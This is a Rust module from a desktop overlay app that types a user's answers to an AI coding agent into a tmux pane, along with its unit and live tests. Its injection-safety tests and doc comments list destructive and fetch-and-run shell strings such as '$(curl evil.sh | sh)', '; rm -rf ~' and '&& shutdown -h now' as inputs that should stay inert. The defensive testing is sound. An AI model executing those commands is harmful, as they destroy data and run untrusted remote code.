//! tmux control surface — the delivery channel for answering an agent's
//! question from the overlay.
//!
//! Why tmux: writing into an agent's pane with `tmux send-keys` needs no
//! macOS Accessibility or Automation permission and never changes the
//! frontmost application, so it cannot violate the overlay's
//! never-take-focus invariant. Every alternative (CGEvent posting,
//! System Events keystroke) fails one or both of those tests.
//!
//! Invariants enforced here:
//!
//! - **Never panics, never blocks forever.** tmux may be absent entirely
//!   (it is not installed on every machine). Every invocation is spawned
//!   with a bounded wait and degrades to `None` / `false` with a debug log.
//! - **`send_literal` is the only path for user-typed text.** It uses
//!   `send-keys -l --` so the payload is one argv element that tmux treats
//!   as literal UTF-8: no key-name lookup, no shell, no metacharacter
//!   expansion. It deliberately does **not** append Enter — submitting is a
//!   separate, explicit `send_keys(pane, &["Enter"])` by the caller.
//! - **Pane resolution is never cached.** Panes die and pids are recycled;
//!   every call re-reads the live pane list.
//!
//! Two tmux behaviours were measured on tmux 3.7b and are compensated for
//! here; both were silent correctness bugs before:
//!
//! 1. `send-keys -l` is *not* inert. ASCII control bytes are forwarded to
//!    the pty raw, so an embedded LF or CR **executes** the text before it
//!    (measured: `send-keys -l $'echo X\necho Y'` ran both commands). TAB
//!    triggers completion and ESC switches TUI modes. [`send_literal`]
//!    therefore refuses any payload containing a C0 control or DEL — see
//!    [`sanitize_literal`] for turning user input into an acceptable one.
//! 2. tmux splits its argv into a command list *before* option parsing, and
//!    strips a trailing `;` from any argument (`const x = 1;` arrived as
//!    `const x = 1`). Payloads are escaped for that, and the payload is
//!    always the LAST argv element so a split can never produce a second
//!    tmux command.

// The send/capture half of the API is the foundation for answering from the
// banner; only `pane_for_terminal` / `focus_pane` have callers so far. Drop
// this allow once the answer-delivery path is wired up.
#![allow(dead_code)]

use std::io::Read;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::mpsc;
use std::thread;
use std::time::Duration;

use serde_json::Value;

/// Upper bound on any child process we shell out to. tmux control commands
/// answer in milliseconds; anything slower means a wedged server and we
/// would rather report failure than stall a UI thread.
const CMD_TIMEOUT: Duration = Duration::from_secs(2);

/// How far up the process tree to walk when matching a recorded pid against
/// live panes. A pane's `pane_pid` is its top process (usually a login
/// shell); the agent may sit several levels below it (shell → shell → node
/// → claude → shim), so the walk has to be generous but still bounded.
const MAX_ANCESTORS: usize = 24;

/// `list-panes` output format: pane id then the pane's top-process pid.
const PANE_FORMAT: &str = "#{pane_id} #{pane_pid}";

/// Places a GUI-launched app has to look for tmux. An app bundle started
/// from Finder/LaunchServices inherits a bare `PATH`
/// (`/usr/bin:/bin:/usr/sbin:/sbin`), which does not contain Homebrew — so
/// resolving by `PATH` alone would report tmux missing for most users.
const FALLBACK_BINS: [&str; 4] = [
    "/opt/homebrew/bin/tmux",
    "/usr/local/bin/tmux",
    "/opt/local/bin/tmux",
    "/usr/bin/tmux",
];

/// A resolved tmux pane target, e.g. `%3`.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct Pane(pub String);

/// How much a resolved pane can be trusted to still be *this* session's.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PaneTrust {
    /// A live process descended from the recorded agent pid is the pane's
    /// process right now. The pane is provably the session's.
    Verified,
    /// Only the stored `$TMUX_PANE` matched a live pane id. tmux restarts
    /// its pane-id counter at `%0` when the server restarts, so a recorded
    /// id from a previous server can collide with an unrelated pane. Fine
    /// for a best-effort jump; do NOT type a user's answer into it.
    Recorded,
}

impl Pane {
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl std::fmt::Display for Pane {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.0)
    }
}

/// Is tmux available on this machine at all?
///
/// Only answers "is the binary there" — a running server is not required
/// (and cannot be, since the user may not have started tmux yet).
pub fn available() -> bool {
    tmux_bin().is_some()
}

/// Live panes as `(pane_id, pane_pid)` pairs, across every session on the
/// default server. Empty when tmux is missing or no server is running.
pub fn list_panes() -> Vec<(String, i32)> {
    match tmux(&["list-panes", "-a", "-F", PANE_FORMAT]) {
        Some(out) => parse_panes(&out),
        None => Vec::new(),
    }
}

/// Resolve the pane for a session from its recorded `terminal_json`.
///
/// Best effort — see [`resolve_pane`] for the trust level, which callers
/// that *write* into the pane must check. `None` when the session is not in
/// tmux (including on machines with no tmux at all).
pub fn pane_for_terminal(terminal_json: &Value) -> Option<Pane> {
    resolve_pane(terminal_json).map(|(pane, _)| pane)
}

/// Resolve the pane and say how it was established.
///
/// The live process tree is checked **first**: walking up the recorded ppid
/// chain and matching each ancestor against live `pane_pid`s resolves an
/// agent nested many processes below the pane's own shell, and — unlike a
/// stored pane id — it is evidence about *now*. The recorded `$TMUX_PANE`
/// is only a fallback for when the agent process is already gone, and is
/// reported as [`PaneTrust::Recorded`].
pub fn resolve_pane(terminal_json: &Value) -> Option<(Pane, PaneTrust)> {
    let panes = list_panes();
    if panes.is_empty() {
        return None;
    }

    let seeds = pid_seeds(terminal_json);
    if let Some(pane) = match_pane(&seeds, &panes, parent_pid) {
        return Some((pane, PaneTrust::Verified));
    }

    let recorded = terminal_json
        .get("tmux_pane")
        .and_then(Value::as_str)
        .map(str::trim)
        .filter(|p| !p.is_empty());
    match recorded {
        Some(id) if panes.iter().any(|(pane, _)| pane == id) => {
            log::debug!("tmux: {id} matched only by record (agent pid {seeds:?} is gone)");
            Some((Pane(id.to_string()), PaneTrust::Recorded))
        }
        _ => {
            log::debug!("tmux: no live pane for {recorded:?} / ancestors of {seeds:?}");
            None
        }
    }
}

/// Send named keys (e.g. `"Down"`, `"Enter"`, `"C-c"`) to a pane.
///
/// Key names ARE interpreted by tmux — never route user-supplied text
/// through here, use [`send_literal`]. Returns false (without sending) for
/// an empty key list, because callers use the return value as "the
/// keystroke was delivered" and a silent no-op must not read as success.
pub fn send_keys(pane: &Pane, keys: &[&str]) -> bool {
    if keys.is_empty() {
        log::debug!("tmux: send_keys called with no keys for {pane}");
        return false;
    }
    tmux_owned(&send_keys_args(pane, keys)).is_some()
}

/// Send LITERAL text to a pane (tmux `send-keys -l`).
///
/// The text is passed as a single argv element after `--`, so tmux performs
/// no key-name lookup and no option parsing on it, and no shell is involved
/// at any point: `; rm -rf ~`, `$(curl … | sh)` and backticks are typed as
/// those characters and sit inert on the pane's input line. **No Enter is
/// appended** — nothing typed here runs until the caller separately sends
/// `Enter`.
///
/// Refuses (returns false, sends nothing) any payload containing a C0
/// control character or DEL, because tmux forwards those to the pty raw:
/// LF/CR would submit the line, TAB would trigger completion, ESC would
/// switch a TUI's mode. Normalise user input with [`sanitize_literal`]
/// first.
pub fn send_literal(pane: &Pane, text: &str) -> bool {
    if text.is_empty() {
        log::debug!("tmux: send_literal called with empty text for {pane}");
        return false;
    }
    if let Some(bad) = text.chars().find(|c| is_unsafe_literal_char(*c)) {
        log::warn!(
            "tmux: refusing literal payload for {pane}: control character {:?}",
            bad
        );
        return false;
    }
    tmux_owned(&literal_args(pane, text)).is_some()
}

/// True when every character of `text` is safe to hand to [`send_literal`].
pub fn is_safe_literal(text: &str) -> bool {
    !text.is_empty() && !text.chars().any(is_unsafe_literal_char)
}

/// Turn arbitrary user input into something [`send_literal`] accepts:
/// every C0 control and DEL becomes a single space, so a multi-line answer
/// arrives as one visible line the user can still read and submit
/// deliberately. Nothing else is altered — no trimming, no truncation.
pub fn sanitize_literal(text: &str) -> String {
    text.chars()
        .map(|c| if is_unsafe_literal_char(c) { ' ' } else { c })
        .collect()
}

/// C0 controls (`0x00..=0x1f`) and DEL. Measured on tmux 3.7b: these are
/// written to the pane's pty as raw bytes even in `-l` mode.
fn is_unsafe_literal_char(c: char) -> bool {
    (c as u32) < 0x20 || c == '\u{7f}'
}

/// Current visible contents of a pane (tmux `capture-pane -p`).
pub fn capture_pane(pane: &Pane) -> Option<String> {
    tmux(&["capture-pane", "-p", "-t", pane.as_str()])
}

/// Best-effort jump: select the pane's window, then the pane, then switch
/// any attached client to it (AC-8.1). True when at least one step applied.
/// The three are tried independently because which of them is meaningful
/// depends on whether a client is attached to that session at all.
pub fn focus_pane(pane: &Pane) -> bool {
    let target = pane.as_str();
    let mut applied = false;
    for verb in ["select-window", "select-pane", "switch-client"] {
        if tmux(&[verb, "-t", target]).is_some() {
            applied = true;
        } else {
            log::debug!("tmux: {verb} -t {target} did not apply");
        }
    }
    if applied {
        log::info!("tmux: pane {target} targeted");
    }
    applied
}

// ---------------------------------------------------------------------------
// Pure helpers (unit-tested without tmux installed)
// ---------------------------------------------------------------------------

/// Parse `list-panes -F "#{pane_id} #{pane_pid}"` output. Unparseable lines
/// are skipped rather than failing the whole listing.
fn parse_panes(stdout: &str) -> Vec<(String, i32)> {
    stdout
        .lines()
        .filter_map(|line| {
            let mut fields = line.split_whitespace();
            let id = fields.next()?;
            let pid: i32 = fields.next()?.parse().ok()?;
            if !id.starts_with('%') || pid <= 0 {
                return None;
            }
            Some((id.to_string(), pid))
        })
        .collect()
}

/// Pids to start the ancestor walk from, most-likely-live first. The shim's
/// own `pid` is already dead by the time the user clicks, so it comes last
/// and only serves as a fallback for adapters that record nothing else.
fn pid_seeds(terminal_json: &Value) -> Vec<i32> {
    let mut seeds: Vec<i32> = Vec::new();
    let mut push = |pid: i64| {
        if pid > 1 && pid <= i32::MAX as i64 {
            let pid = pid as i32;
            if !seeds.contains(&pid) {
                seeds.push(pid);
            }
        }
    };
    if let Some(chain) = terminal_json.get("ppid_chain").and_then(Value::as_array) {
        for entry in chain {
            if let Some(pid) = entry.as_i64() {
                push(pid);
            }
        }
    }
    if let Some(pid) = terminal_json.get("pid").and_then(Value::as_i64) {
        push(pid);
    }
    seeds
}

/// Walk up from each seed pid until an ancestor is some pane's `pane_pid`.
/// `parent_of` is injected so the traversal is testable against a synthetic
/// process tree. Bounded by [`MAX_ANCESTORS`] and by a self-parent check,
/// so a lying `parent_of` cannot spin forever.
fn match_pane<F>(seeds: &[i32], panes: &[(String, i32)], parent_of: F) -> Option<Pane>
where
    F: Fn(i32) -> Option<i32>,
{
    for &seed in seeds {
        let mut current = seed;
        for _ in 0..MAX_ANCESTORS {
            if current <= 1 {
                break;
            }
            if let Some((id, _)) = panes.iter().find(|(_, pid)| *pid == current) {
                return Some(Pane(id.clone()));
            }
            match parent_of(current) {
                Some(parent) if parent != current => current = parent,
                _ => break,
            }
        }
    }
    None
}

/// argv for [`send_keys`]. `--` terminates option parsing so a key list can
/// never be mistaken for flags.
fn send_keys_args(pane: &Pane, keys: &[&str]) -> Vec<String> {
    let mut args = vec![
        "send-keys".to_string(),
        "-t".to_string(),
        pane.0.clone(),
        "--".to_string(),
    ];
    args.extend(keys.iter().map(|k| (*k).to_string()));
    args
}

/// argv for [`send_literal`]. Exactly one element carries the payload, it is
/// the LAST element, and no element submits it.
fn literal_args(pane: &Pane, text: &str) -> Vec<String> {
    vec![
        "send-keys".to_string(),
        "-t".to_string(),
        pane.0.clone(),
        "-l".to_string(),
        "--".to_string(),
        escape_trailing_semicolon(text),
    ]
}

/// tmux's command-list splitter runs before option parsing and strips a
/// trailing `;` from an argument, restoring it only when the character
/// before it is a backslash. Measured: `const x = 1;` arrived as
/// `const x = 1`, while `const x = 1\;` arrived intact. Only the final
/// character is ever examined by that rule, so only it needs escaping.
///
/// Keeping the payload last in argv is what makes this a truncation bug and
/// not a tmux-command-injection hole: an argument split off at the payload
/// would start an empty command, which tmux discards.
fn escape_trailing_semicolon(text: &str) -> String {
    match text.strip_suffix(';') {
        Some(head) => format!("{head}\\;"),
        None => text.to_string(),
    }
}

// ---------------------------------------------------------------------------
// Process plumbing
// ---------------------------------------------------------------------------

// Test-only override of binary lookup. Thread-local, so tests running in
// parallel cannot see each other's override. Outer `Option` = "override
// active", inner = the value `tmux_bin` should return.
#[cfg(test)]
thread_local! {
    static BIN_OVERRIDE: std::cell::RefCell<Option<Option<PathBuf>>> =
        const { std::cell::RefCell::new(None) };
}

/// Run `body` as if tmux were not installed — used so the graceful-
/// degradation tests assert the same thing on machines that do have tmux.
#[cfg(test)]
fn with_tmux_absent<T>(body: impl FnOnce() -> T) -> T {
    BIN_OVERRIDE.with(|slot| *slot.borrow_mut() = Some(None));
    let out = body();
    BIN_OVERRIDE.with(|slot| *slot.borrow_mut() = None);
    out
}

/// Locate the tmux binary. Resolved fresh on every call (a handful of
/// `stat`s) so installing tmux does not require restarting the app.
///
/// Windows joins `"tmux"`, not `"tmux.exe"`, so `available()` is always
/// false there. That is intentional: there is no native Windows tmux, and
/// tmux is an optional accelerator everywhere — never a requirement.
fn tmux_bin() -> Option<PathBuf> {
    #[cfg(test)]
    if let Some(overridden) = BIN_OVERRIDE.with(|slot| slot.borrow().clone()) {
        return overridden;
    }

    if let Some(path) = std::env::var_os("PATH") {
        for dir in std::env::split_paths(&path) {
            if dir.as_os_str().is_empty() {
                continue;
            }
            let candidate = dir.join("tmux");
            if is_executable(&candidate) {
                return Some(candidate);
            }
        }
    }
    FALLBACK_BINS
        .iter()
        .map(PathBuf::from)
        .find(|c| is_executable(c))
}

fn is_executable(path: &Path) -> bool {
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::metadata(path)
            .map(|m| m.is_file() && m.permissions().mode() & 0o111 != 0)
            .unwrap_or(false)
    }
    #[cfg(not(unix))]
    {
        path.is_file()
    }
}

fn tmux(args: &[&str]) -> Option<String> {
    let bin = match tmux_bin() {
        Some(bin) => bin,
        None => {
            log::debug!("tmux: binary not found; {args:?} skipped");
            return None;
        }
    };
    run(&bin, args)
}

fn tmux_owned(args: &[String]) -> Option<String> {
    let borrowed: Vec<&str> = args.iter().map(String::as_str).collect();
    tmux(&borrowed)
}

/// Run `bin args…` with stdin closed, stderr discarded and stdout captured,
/// giving up after [`CMD_TIMEOUT`]. `None` on spawn failure, timeout, or a
/// non-zero exit. Never panics.
fn run(bin: &Path, args: &[&str]) -> Option<String> {
    let mut child = match Command::new(bin)
        .args(args)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn()
    {
        Ok(child) => child,
        Err(err) => {
            log::debug!("tmux: spawn {args:?} failed: {err}");
            return None;
        }
    };

    let Some(mut stdout) = child.stdout.take() else {
        reap(&mut child);
        return None;
    };

    // Read on a helper thread so a wedged tmux server cannot pin the caller
    // (a UI command thread) forever.
    let (tx, rx) = mpsc::channel();
    thread::spawn(move || {
        let mut buf = Vec::new();
        let result = stdout.read_to_end(&mut buf).map(|_| buf);
        let _ = tx.send(result);
    });

    let buf = match rx.recv_timeout(CMD_TIMEOUT) {
        Ok(Ok(buf)) => buf,
        Ok(Err(err)) => {
            log::debug!("tmux: reading output of {args:?} failed: {err}");
            reap(&mut child);
            return None;
        }
        Err(_) => {
            log::info!("tmux: {args:?} timed out after {CMD_TIMEOUT:?}");
            reap(&mut child);
            return None;
        }
    };

    match wait_bounded(&mut child) {
        Some(status) if status.success() => Some(String::from_utf8_lossy(&buf).into_owned()),
        Some(status) => {
            log::debug!("tmux: {args:?} exited with {status}");
            None
        }
        None => {
            log::debug!("tmux: {args:?} did not exit after closing stdout");
            None
        }
    }
}

/// Reap the child within [`CMD_TIMEOUT`]. A process that closes stdout
/// without exiting must not pin the caller, so the wait is polled rather
/// than blocking. Normally returns on the first iteration.
fn wait_bounded(child: &mut std::process::Child) -> Option<std::process::ExitStatus> {
    let deadline = std::time::Instant::now() + CMD_TIMEOUT;
    loop {
        match child.try_wait() {
            Ok(Some(status)) => return Some(status),
            Ok(None) => {
                if std::time::Instant::now() >= deadline {
                    reap(child);
                    return None;
                }
                thread::sleep(Duration::from_millis(5));
            }
            Err(err) => {
                log::debug!("tmux: waiting on child failed: {err}");
                return None;
            }
        }
    }
}

/// Kill only the direct child — enough for tmux, whose client is a single
/// process. A child that spawned its own children can leave grandchildren
/// behind; that is why nothing but tmux and `ps` is run through here.
fn reap(child: &mut std::process::Child) {
    let _ = child.kill();
    let _ = child.wait();
}

/// Parent pid via `ps` — used for the ancestor walk. Shelling out avoids a
/// `sysctl`/libproc dependency and only happens on explicit user actions.
pub(crate) fn parent_pid(pid: i32) -> Option<i32> {
    #[cfg(unix)]
    {
        if pid <= 1 {
            return None;
        }
        let out = run(Path::new("/bin/ps"), &["-o", "ppid=", "-p", &pid.to_string()])?;
        out.trim().parse().ok()
    }
    #[cfg(not(unix))]
    {
        let _ = pid;
        None
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    // -- pane list parsing --------------------------------------------------

    #[test]
    fn parses_realistic_list_panes_output() {
        // As emitted by `tmux list-panes -a -F "#{pane_id} #{pane_pid}"`.
        let out = "%0 41231\n%1 41288\n%12 52007\n";
        assert_eq!(
            parse_panes(out),
            vec![
                ("%0".to_string(), 41231),
                ("%1".to_string(), 41288),
                ("%12".to_string(), 52007),
            ]
        );
    }

    #[test]
    fn pane_parsing_skips_junk_instead_of_failing() {
        let out = "\n%0 41231\nno server running on /tmp/tmux-501/default\n%1 notapid\n%2 0\nbare\n%3 900\n";
        assert_eq!(
            parse_panes(out),
            vec![("%0".to_string(), 41231), ("%3".to_string(), 900)]
        );
        assert!(parse_panes("").is_empty());
    }

    // -- ppid chain extraction ---------------------------------------------

    #[test]
    fn seeds_come_from_ppid_chain_then_pid() {
        // Exactly the shape `terminal_info()` in shim/src/main.rs produces.
        let terminal = json!({
            "pid": 60123,
            "ppid_chain": [60100],
            "tty": null,
            "tmux_pane": null,
            "term_program": "iTerm.app",
            "hwnd": null,
        });
        assert_eq!(pid_seeds(&terminal), vec![60100, 60123]);
    }

    #[test]
    fn seeds_are_deduped_and_reject_nonsense() {
        let terminal = json!({
            "pid": 500,
            "ppid_chain": [500, 1, 0, -3, "nope", 400],
        });
        assert_eq!(pid_seeds(&terminal), vec![500, 400]);
        assert!(pid_seeds(&json!({})).is_empty());
        assert!(pid_seeds(&json!({ "ppid_chain": "not-an-array" })).is_empty());
    }

    // -- pid-based pane discovery ------------------------------------------

    /// Pane %1's top process is the login shell 200; the agent is nested
    /// several levels below it (shell → shell → node → claude → shim).
    fn nested_tree(pid: i32) -> Option<i32> {
        match pid {
            60123 => Some(60100), // shim  -> claude
            60100 => Some(52007), // claude -> node
            52007 => Some(41288), // node  -> nested shell
            41288 => Some(200),   // nested shell -> pane's login shell
            200 => Some(3),       // login shell -> tmux server
            3 => Some(1),
            _ => None,
        }
    }

    #[test]
    fn resolves_pane_from_a_deep_descendant_pid() {
        let panes = vec![("%0".to_string(), 100), ("%1".to_string(), 200)];
        // Seed is five levels below the pane's own pid.
        assert_eq!(
            match_pane(&[60123], &panes, nested_tree),
            Some(Pane("%1".to_string()))
        );
    }

    #[test]
    fn resolves_pane_when_the_seed_is_the_pane_pid_itself() {
        let panes = vec![("%0".to_string(), 100), ("%1".to_string(), 200)];
        assert_eq!(
            match_pane(&[200], &panes, nested_tree),
            Some(Pane("%1".to_string()))
        );
    }

    #[test]
    fn no_match_when_no_ancestor_owns_a_pane() {
        let panes = vec![("%0".to_string(), 100)];
        assert_eq!(match_pane(&[60123], &panes, nested_tree), None);
        assert_eq!(match_pane(&[], &panes, nested_tree), None);
        assert_eq!(match_pane(&[60123], &[], nested_tree), None);
    }

    #[test]
    fn later_seeds_are_tried_when_earlier_ones_are_dead() {
        let panes = vec![("%7".to_string(), 200)];
        // 999 is a dead pid: `ps` yields nothing, so the walk must move on
        // to the next seed rather than give up.
        assert_eq!(
            match_pane(&[999, 60100], &panes, nested_tree),
            Some(Pane("%7".to_string()))
        );
    }

    #[test]
    fn ancestor_walk_always_terminates() {
        let panes = vec![("%0".to_string(), 100)];
        // Self-parent (would loop forever without the `parent != current`
        // guard).
        assert_eq!(match_pane(&[5000], &panes, Some), None);
        // Endless distinct ancestors: bounded by MAX_ANCESTORS.
        let calls = std::cell::Cell::new(0usize);
        assert_eq!(
            match_pane(&[1_000_000], &panes, |pid| {
                calls.set(calls.get() + 1);
                Some(pid + 1)
            }),
            None
        );
        assert!(calls.get() <= MAX_ANCESTORS);
    }

    // -- argv construction / injection safety ------------------------------

    const SUBMIT_KEYS: [&str; 5] = ["Enter", "C-m", "KPEnter", "\r", "\n"];

    #[test]
    fn send_keys_passes_each_key_as_its_own_argv_element() {
        let args = send_keys_args(&Pane("%3".into()), &["Down", "Down", "Enter"]);
        assert_eq!(
            args,
            vec!["send-keys", "-t", "%3", "--", "Down", "Down", "Enter"]
        );
    }

    /// The core safety property: arbitrary user text handed to
    /// `send_literal` reaches tmux as ONE literal argument and nothing in
    /// the command submits it. There is no shell in the path (we exec tmux
    /// directly), so `; rm -rf ~` is typed into the pane as those exact
    /// characters and simply sits there until a human-driven Enter.
    #[test]
    fn send_literal_cannot_by_itself_execute_anything() {
        for payload in [
            "; rm -rf ~",
            "$(curl evil.sh | sh)",
            "`whoami`",
            "&& shutdown -h now",
            "answer with 'quotes' and \"double quotes\"",
            "--dangerously-skip-permissions",
            "-t %0 Enter",
            "rm -rf / #",
        ] {
            assert!(is_safe_literal(payload), "{payload:?} should be sendable");
            let args = literal_args(&Pane("%3".into()), payload);

            // Literal mode, option parsing terminated, single payload arg,
            // and the payload is LAST (see `escape_trailing_semicolon`).
            assert_eq!(args[0], "send-keys");
            assert_eq!(args[1], "-t");
            assert_eq!(args[2], "%3");
            assert_eq!(args[3], "-l");
            assert_eq!(args[4], "--");
            assert_eq!(args[5], payload, "payload must survive verbatim");
            assert_eq!(args.len(), 6, "payload must not be split across argv");

            // Nothing in the argv presses Enter for the user.
            for arg in &args {
                assert!(
                    !SUBMIT_KEYS.contains(&arg.as_str()),
                    "send_literal must never submit: {arg:?}"
                );
            }
        }
    }

    /// Measured on tmux 3.7b: `send-keys -l` forwards C0 bytes to the pty
    /// raw, so `$'echo X\necho Y'` executed BOTH commands. Control
    /// characters must therefore never reach tmux — which is what makes
    /// "nothing runs without a deliberate Enter" actually true.
    #[test]
    fn control_characters_are_refused_not_forwarded() {
        let pane = Pane("%3".into());
        for payload in [
            "yes\nrm -rf /\n", // LF submits: the whole reason for this rule
            "echo pwned\r",    // CR submits too
            "answer\tcompletion",
            "\u{1b}]0;title\u{7}",
            "back\u{7f}space",
            "nul\u{0}byte",
        ] {
            assert!(!is_safe_literal(payload), "{payload:?} must be rejected");
            // Rejected before any process is spawned, so this holds whether
            // or not tmux is installed.
            assert!(
                !send_literal(&pane, payload),
                "{payload:?} must not be sent"
            );
        }
    }

    #[test]
    fn sanitize_makes_arbitrary_input_sendable_without_dropping_it() {
        let messy = "line one\nline two\ttabbed\r\u{1b}[31m";
        let clean = sanitize_literal(messy);
        assert_eq!(clean, "line one line two tabbed  [31m");
        assert!(is_safe_literal(&clean));
        // Same length: characters are replaced, never removed, so nothing
        // the user typed silently disappears.
        assert_eq!(clean.chars().count(), messy.chars().count());
    }

    /// tmux strips a trailing `;` from an argument before option parsing —
    /// measured: `const x = 1;` arrived as `const x = 1`, `const x = 1\;`
    /// arrived intact.
    #[test]
    fn trailing_semicolon_is_escaped_so_it_is_not_truncated() {
        assert_eq!(escape_trailing_semicolon("const x = 1;"), "const x = 1\\;");
        assert_eq!(escape_trailing_semicolon(";"), "\\;");
        // Semicolons anywhere else are untouched — tmux only inspects the
        // final character.
        assert_eq!(escape_trailing_semicolon("a; b"), "a; b");
        assert_eq!(escape_trailing_semicolon("no semi"), "no semi");
        assert_eq!(escape_trailing_semicolon("trailing slash\\"), "trailing slash\\");
        // The escaped payload is still exactly one argv element, still last.
        let args = literal_args(&Pane("%3".into()), "x;");
        assert_eq!(args.len(), 6);
        assert_eq!(args[5], "x\\;");
    }

    #[test]
    fn submitting_is_a_separate_deliberate_call() {
        // Documents the intended two-step protocol for callers.
        let pane = Pane("%3".into());
        assert!(!literal_args(&pane, "ship it").contains(&"Enter".to_string()));
        assert!(send_keys_args(&pane, &["Enter"]).contains(&"Enter".to_string()));
    }

    // -- graceful degradation ----------------------------------------------

    /// tmux is OPTIONAL: most users will not have it, and the app must
    /// behave identically to one where the feature simply is not offered.
    /// Asserted with the binary lookup forced to "missing", so this holds on
    /// machines that DO have tmux installed too.
    #[test]
    fn every_entry_point_degrades_when_tmux_is_absent() {
        with_tmux_absent(|| {
            let bogus = Pane("%0".into());
            let terminal = json!({ "pid": 60123, "ppid_chain": [60100], "tmux_pane": "%0" });

            assert!(!available(), "override must make tmux look missing");
            assert!(list_panes().is_empty());
            assert_eq!(pane_for_terminal(&terminal), None);
            assert_eq!(resolve_pane(&terminal), None);
            assert_eq!(capture_pane(&bogus), None);
            assert!(!send_keys(&bogus, &["Enter"]));
            assert!(!send_literal(&bogus, "hello"));
            assert!(!focus_pane(&bogus));
        });
    }

    /// A binary that exists but is not tmux (or is not executable) must be
    /// just as harmless as no binary at all.
    #[test]
    fn a_bogus_tmux_binary_is_as_harmless_as_a_missing_one() {
        BIN_OVERRIDE.with(|slot| {
            *slot.borrow_mut() = Some(Some(PathBuf::from("/nonexistent/definitely/not/tmux")))
        });
        let bogus = Pane("%0".into());
        assert!(available(), "override points at a path, so lookup 'succeeds'");
        assert!(list_panes().is_empty());
        assert_eq!(capture_pane(&bogus), None);
        assert!(!send_keys(&bogus, &["Enter"]));
        assert!(!send_literal(&bogus, "hello"));
        BIN_OVERRIDE.with(|slot| *slot.borrow_mut() = None);
    }

    /// The real machine, whatever it is: a pane id that cannot exist must
    /// never resolve or accept input, and nothing may panic.
    #[test]
    fn impossible_pane_is_rejected_on_this_machine() {
        let bogus = Pane("%999999".into());
        assert_eq!(capture_pane(&bogus), None);
        assert!(!send_keys(&bogus, &["Enter"]));
        assert!(!send_literal(&bogus, "hello"));
        assert!(!focus_pane(&bogus));
        // Long-dead pids with no recorded pane must not resolve either.
        let terminal = json!({ "pid": 2, "ppid_chain": [2] });
        assert_eq!(pane_for_terminal(&terminal), None);
    }

    #[test]
    fn empty_payloads_report_failure_rather_than_false_success() {
        let pane = Pane("%0".into());
        assert!(!send_keys(&pane, &[]));
        assert!(!send_literal(&pane, ""));
        assert!(!is_safe_literal(""));
    }

    #[test]
    fn parent_pid_never_panics_on_absurd_input() {
        assert_eq!(parent_pid(0), None);
        assert_eq!(parent_pid(-1), None);
        assert_eq!(parent_pid(1), None);
        // A pid that (almost certainly) does not exist.
        assert_eq!(parent_pid(i32::MAX), None);
    }

    /// A NUL byte cannot be put in an argv element; `Command::spawn` returns
    /// an error rather than panicking. Rejected earlier as a control char,
    /// but the plumbing must survive it regardless.
    #[test]
    fn nul_bytes_do_not_panic_the_runner() {
        assert_eq!(run(Path::new("/bin/echo"), &["a\u{0}b"]), None);
    }

    // -- live tmux verification (opt-in) -----------------------------------
    //
    // Requires tmux on the machine. Run with:
    //   cargo test -p pingmybell tmux::tests::live -- --ignored --nocapture
    //
    // These cover the integration facts that cannot be asserted without a
    // real server: that `--` is consumed by tmux's option parser, that
    // literal text arrives verbatim, and that a deep pid resolves to its
    // pane.

    #[test]
    #[ignore = "requires tmux installed"]
    fn live_literal_text_arrives_verbatim_and_unexecuted() {
        assert!(available(), "tmux not installed");
        let session = "pmb-selftest-literal";
        let bin = tmux_bin().unwrap();
        let _ = run(&bin, &["kill-session", "-t", session]);
        assert!(
            run(&bin, &["new-session", "-d", "-s", session, "-x", "200", "-y", "50"]).is_some(),
            "could not start scratch session"
        );

        let pane = run(&bin, &["list-panes", "-t", session, "-F", "#{pane_id}"])
            .map(|s| Pane(s.trim().to_string()))
            .expect("scratch pane");
        // The scratch pane must also show up in the global listing.
        assert!(list_panes().iter().any(|(id, _)| *id == pane.0));

        // Dangerous-looking text, a leading dash to prove `--` is consumed,
        // and a trailing `;` to prove the escape survives tmux's splitter.
        let payload = "-l ; echo PMB_SHOULD_NOT_RUN $(whoami) `id` && true;";
        assert!(send_literal(&pane, payload));
        thread::sleep(Duration::from_millis(400));
        let shown = capture_pane(&pane).expect("capture");
        assert!(
            shown.contains(payload),
            "literal payload not verbatim on screen (trailing ';' truncated?):\n{shown}"
        );
        // Nothing ran: the text is still sitting on the prompt line, so the
        // echo never produced its own output line.
        assert!(
            !shown.lines().any(|l| l.starts_with("PMB_SHOULD_NOT_RUN")),
            "payload executed without an Enter:\n{shown}"
        );

        // A control character must be refused outright rather than typed.
        assert!(!send_literal(&pane, "echo PMB_CONTROL\n"));
        thread::sleep(Duration::from_millis(300));
        let after = capture_pane(&pane).expect("capture");
        assert!(
            !after.lines().any(|l| l.starts_with("PMB_CONTROL")),
            "a newline payload was forwarded and executed:\n{after}"
        );

        // Clear the line without executing, then tear down.
        assert!(send_keys(&pane, &["C-u"]));
        let _ = run(&bin, &["kill-session", "-t", session]);
    }

    #[test]
    #[ignore = "requires tmux installed"]
    fn live_deep_pid_resolves_to_its_pane() {
        assert!(available(), "tmux not installed");
        let session = "pmb-selftest-pid";
        let bin = tmux_bin().unwrap();
        let _ = run(&bin, &["kill-session", "-t", session]);
        assert!(run(&bin, &["new-session", "-d", "-s", session]).is_some());
        let pane = run(&bin, &["list-panes", "-t", session, "-F", "#{pane_id}"])
            .map(|s| Pane(s.trim().to_string()))
            .expect("scratch pane");

        // Nest shells several levels below the pane's own process. The
        // `exit 0` after the recursive call is what stops `sh` from
        // exec-collapsing the chain into a single process.
        let script = std::env::temp_dir().join("pmb-tmux-selftest-nest.sh");
        std::fs::write(
            &script,
            "#!/bin/sh\nn=$1\nif [ \"$n\" -gt 0 ]; then\n  sh \"$0\" $((n - 1))\n  exit 0\nfi\necho PMBPID $$\nsleep 60\n",
        )
        .expect("write nest script");

        assert!(send_literal(&pane, &format!("sh {} 4", script.display())));
        assert!(send_keys(&pane, &["Enter"]));
        thread::sleep(Duration::from_millis(2500));
        let shown = capture_pane(&pane).expect("capture");
        let deep: i32 = shown
